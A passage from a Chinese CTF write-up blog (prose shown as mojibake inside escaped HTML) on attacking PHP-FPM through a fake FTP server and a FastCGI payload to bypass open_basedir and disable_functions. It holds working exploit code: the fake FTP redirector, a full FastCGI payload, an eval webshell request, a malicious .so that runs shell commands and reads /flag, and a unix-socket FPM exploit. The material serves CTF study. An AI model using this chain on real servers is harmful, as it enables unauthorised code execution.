&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencodeä¹‹åŽä¼ å…¥ï¼Œå†æ‰«ä¸€ä¸‹ç«¯å£å¯ä»¥çœ‹åˆ°46819å¼€æ”¾ï¼Œè¯´æ˜ŽæœåŠ¡æ­£å¸¸ï¼›è¿˜æ˜¯ç”¨ä¹‹å‰pç‰›çš„è„šæœ¬æž„é€ ï¼Œè¿™é‡Œæˆ‘ä»¬è¦ä¿®æ”¹çš„é…ç½®é¡¹æ˜¯è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>è¦†ç›–æŽ‰open_basedirçš„åŽŸæœ‰è®¾ç½®ï¼Œå†åŠ ä¸Š.soæ–‡ä»¶ï¼ˆç¨åŽä¸Šä¼ ï¼‰ï¼›å…·ä½“çš„payloadä¹Ÿå¯ä»¥ç”¨pç‰›çš„è„šæœ¬é­”æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>æ³¨é‡ŠæŽ‰157-159å¯¹è¿žæŽ¥çŠ¶æ€çš„åˆ¤æ–­ï¼Œåœ¨191åˆ›å»ºè¿žæŽ¥å‰å°†requestéƒ¨åˆ†ç›´æŽ¥è¾“å‡ºurlencodeçš„ç‰ˆæœ¬ç„¶åŽexit(0)ä¸€æ³¢é€€å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>å†™æ¶æ„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼ .so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>è¯•ç€æ‰§è¡Œä¸€ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸè§£é™¤open_basedirçš„é™åˆ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>ä½†æ˜¯ä¸€æ ·çš„æ“ä½œä¹‹åŽå°±æ‰§è¡Œä¸äº†äº†â€¦â€¦å°±ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œå°±æ­£å¸¸å‡ºæ¥äº†ç¬¬ä¸€æ¬¡ï¼Œç„¶åŽå°±ä¸è¡Œäº†ï¼Œéžå¸¸çš„ç¦»è°±å•Šå•Šå•Šå•Šå•Š&lt;/p>
&lt;p>æ­£å¸¸æ¥è¯´ï¼Œåªæœ‰open_basedirè¢«è§£æ”¾åŽæ‰å¯ä»¥scandir('/')ï¼ˆæ²¡æœ‰çš„è¯æ˜¯åªå¯ä»¥scandir('/var/www/html')ï¼‰ï¼Œè€Œæ—¢ç„¶è¿™æ ·å¯ä»¥æ‰§è¡ŒæˆåŠŸå°±è¯´æ˜Žå¼€å§‹çš„fpmæµé‡ä¸€å®šè¢«æ­£å¸¸æ‰“å‡ºåŽ»äº†ï¼Œå†åŠ ä¸Š.soä¹Ÿè¢«å†™å…¥ï¼ˆæˆ‘åˆ°dockerä¸Šçœ‹äº†ï¼‰ï¼Œé‚£ä¹ˆ.soä¸€å®šä¼šåœ¨phpæ‰§è¡Œæ—¶è¢«è§¦å‘ï¼Œä¸€å®šæ˜¯å¯ä»¥æ‰§è¡Œ.soä¸­æˆ‘ä»¬å†™çš„å‘½ä»¤çš„ï¼›ä½†æ˜¯çŽ°åœ¨ç«Ÿç„¶è¿žscandir('/')éƒ½åªèƒ½æ‰§è¡Œä¸€æ¬¡ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼ŸåŽé¢å°±éƒ½å¤±è´¥äº†ï¼Œæ›´ä¸è¦è¯´.soä¸­çš„å‘½ä»¤äº†ï¼Œè‚¯å®šæ›´æ˜¯æ²¡æœ‰æ‰§è¡Œ&lt;/p>
&lt;p>ä¹‹åŽåˆå°è¯•äº†å¾ˆå¤šæ¬¡ï¼Œ.soæ­£å¸¸ä¸Šä¼ ï¼Œæœ€å¼€å§‹æ‰“å‘fpmçš„æµé‡ä¹Ÿåˆæ‰“äº†å‡ éï¼Œå¤±è´¥ï¼›å†ä¹‹åŽ.soä¹Ÿä¸èƒ½æ­£å¸¸ä¸Šä¼ äº†ï¼Œæœ€åˆçš„é‚£ä¸ªæµé‡ä¹Ÿæ‰“ä¸æˆäº†ï¼Œåªèƒ½å›žæ˜¾int(xxx)ï¼Œä½†æ˜¯æ²¡æœ‰eval()çš„å›žæ˜¾ï¼Œè¯´æ˜Žè¿˜æ˜¯ä¸æ­£å¸¸ï¼Œç„¶åŽä»–å¦ˆçš„ï¼Œé—´æˆ–æœ‰ä¸€ä¸¤æ¬¡èƒ½æˆåŠŸï¼Œç”šè‡³æˆ‘éƒ½åˆåœ¨/tmpç›®å½•ä¸‹å†™äº†åˆ«çš„æ–‡ä»¶ï¼ˆå¦‚æžœå‰é¢çš„æµé‡æ²¡æ­£å¸¸æ‰“å‡ºåŽ»çš„è¯æ˜¯ç»å¯¹ä¸å¯èƒ½åšåˆ°çš„ï¼Œè‚¯å®šæ˜¯bool(false)ï¼‰ï¼Œä½†æ˜¯ä½†æ˜¯ä½†æ˜¯åˆæ˜¯ä¸€ç§’ç ´åŠŸï¼ŒçœŸæ˜¯ä¸ç†è§£äº†ï¼Œå®Œå…¨æ˜¯è·Ÿå‰é¢ä¸€æ¨¡ä¸€æ ·çš„payloadï¼Œä½†æ˜¯å°±ä»–å¦ˆçŽ„å­¦ï¼Œåäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115014616324.png" alt="image-20211115014616324">&lt;/p>
&lt;p>ä¸æƒ³å†è€—å¤ªå¤šæ—¶é—´åœ¨è¿™ä¸ªé¢˜ä¸Šäº†ï¼Œå®žåœ¨æ˜¯ç»·ä¸ä½äº†ï¼ˆè°ƒäº†å¿«1å¤©äº†ï¼‰ï¼ŒåŸºæœ¬ä¹Ÿç®—æ˜¯æ‰“é€šäº†ï¼ˆæ¯•ç«Ÿå°±å·®ä¸€ç‚¹ç‚¹å•Šå•Šå•Šå•Šå•Š æˆ‘æˆªå›¾è¿˜æœ‰å‘¢ï¼‰ï¼ˆå…¶å®žæ˜¯æ‡’çš„é‡ç½®dockerå†å°è¯•äº† æˆ‘çš„ï¼‰ï¼Œæˆ‘çŒœæµ‹å‡ºé”™çš„ç‚¹åœ¨äºŽé‚£ä¸ªå¼€åœ¨46819ç«¯å£çš„ftpæœåŠ¡å™¨ä¸ç¨³å®šï¼Œå®ƒåœ¨å¤„ç†è¿™è¾¹ftpæ‰“å‡ºçš„æµé‡æ—¶å¯èƒ½æ²¡æœ‰æ­£å¸¸çš„å¤„ç†ï¼Œå†åŠ ä¸Šæ¥å›žè°ƒæ•´payloadæ‰“äº†å¤ªå¤šæ¬¡äº†ï¼Œå¯èƒ½ä¹‹å‰çš„é”™è¯¯ç´¯ç§¯åˆ°åŽé¢ï¼Œæ¯”å¦‚æŸæ¬¡æ²¡æœ‰urlencodeä¹‹ç±»çš„ï¼Œæžå¾—çŽ¯å¢ƒä¹Ÿä¸æ­£å¸¸äº†&lt;/p>
&lt;h4 id="è“å¸½æ¯-2021one-pointer-php">***[è“å¸½æ¯ 2021]One Pointer PHP&lt;/h4>
&lt;hr>
&lt;p>yysyï¼Œç¡®å®žæ²¡æ—¶é—´å¤çŽ°ï¼ˆå¤çŽ°èµµæ€»çš„é¢˜è®©æˆ‘æœ‰å¿ƒç†é˜´å½±äº†ï¼‰&lt;/p>
&lt;p>æˆ‘å°±å…ˆäº‘ä¸€ä¸‹ï¼Œå¯¹8èµ·&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://www.yang99.top/index.php/archives/52/">wp1&lt;/a> | &lt;a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">wp2&lt;/a>&lt;/p>
&lt;h3 id="æ”»å‡»unix-socketæ¨¡å¼ä¸‹çš„php-fpm">æ”»å‡»unix socketæ¨¡å¼ä¸‹çš„php-fpm&lt;/h3>
&lt;p>ç”±äºŽunix socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œé‚£å¿…ç„¶æ˜¯ä¸èƒ½æ‰“è¿œç¨‹ï¼Œç”¨çš„æ˜¯&lt;code>stream_socket_client&lt;/code>å»ºç«‹ä¸€ä¸ªunix socketè¿žæŽ¥ï¼Œç„¶åŽå†™å…¥tcpæµæ¥é€šä¿¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ctf-2019echohub">[*CTF 2019]Echohub&lt;/h4>
&lt;p>å‰é¢çš„pwnéƒ¨åˆ†æˆ‘æ˜¯ä¸å¤ªèƒ½çœ‹æ‡‚ï¼ˆè‡³å°‘ç›®å‰ï¼‰ï¼Œå°±ç®€å•è¯´è¯´åŽé¢çš„webéƒ¨åˆ†ï¼›&lt;a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Echohub">è¿™é‡Œæ˜¯å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>ä»Žphpinfoå¯ä»¥çœ‹åˆ°disable_functions&lt;/p>
&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>è€ƒè™‘ç”¨&lt;code>create_function&lt;/code>æ¥rceï¼Œä¸è¿‡è¿˜æ˜¯ç»•ä¸è¿‡disable_functionsæ¥æ‰§è¡Œ/readflag&lt;/p>
&lt;p>ä¸è¿‡è·‘ä¸€ä¸‹ç»™å‡ºçš„dockerï¼Œå¯ä»¥çœ‹åˆ°ç”¨unix socketæ¨¡å¼è¿è¡Œçš„php-fpm&lt;/p>
&lt;p>é¢˜ç›®çŽ¯å¢ƒå®‰è£…äº†apacheæœåŠ¡å™¨å’Œapache-moduleæ¨¡å¼çš„phpæ¨¡å—ï¼ˆè¿™ä¸ªå°±æ˜¯é¢˜ç›®çŽ¯å¢ƒï¼‰ï¼Œä½†æ˜¯fpmä¹Ÿå®‰è£…äº†å¹¶ä¸”å¯åŠ¨&lt;/p>
&lt;p>fpmæ¨¡å¼çš„php.iniä¸Žphpinfoä¸­æ˜¾ç¤ºçš„ä¸åŒï¼Œæ˜¯ç‹¬ç«‹çš„ï¼Œdisable_funtcionsçš„é™åˆ¶å®½æ¾å¾ˆå¤šï¼Œæˆ‘ä»¬æ¥æ‰“å®ƒæ¥rceï¼Œexpå°±æ˜¯ä¸Šé¢é‚£ä¸ª&lt;/p>
&lt;hr>
&lt;p>æ‹–æ‹–æ‹‰æ‹‰å››äº”å¤©ï¼Œæ€»ç®—æ˜¯æŠ½ç©ºç»™æ€»ç»“å®Œäº†ï¼Œå¯¹åšé¢˜å’Œå­¦ä¹ æ–¹é¢åˆæœ‰äº†ä¸€äº›èˆ¹æ–°çš„ç†è§£ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶èŽ·çš„&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgiåè®®åˆ†æžä¸Žå®žä¾‹&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm ä¸Ž Nginxä¼˜åŒ–æ€»ç»“&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP è¿žæŽ¥æ–¹å¼ &amp;amp; PHP-FPMæœªæŽˆæƒè®¿é—®æ¼æ´ž &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">æµ…æžphp-fpmçš„æ”»å‡»æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æž &amp;amp;&amp;amp; PHP-FPMæœªæŽˆæƒè®¿é—®æ¼æ´ž &amp;amp;&amp;amp; Expç¼–å†™&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">ã€æŠ€æœ¯åˆ†äº«ã€‘æ·±å…¥ FTP æ”»å‡» php-fpm ç»•è¿‡ disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä¸€ç‚¹å¯¹è¿‘å†µçš„ç¢Žç¢Žå¿µ
&lt;/h4>
&lt;/summary>
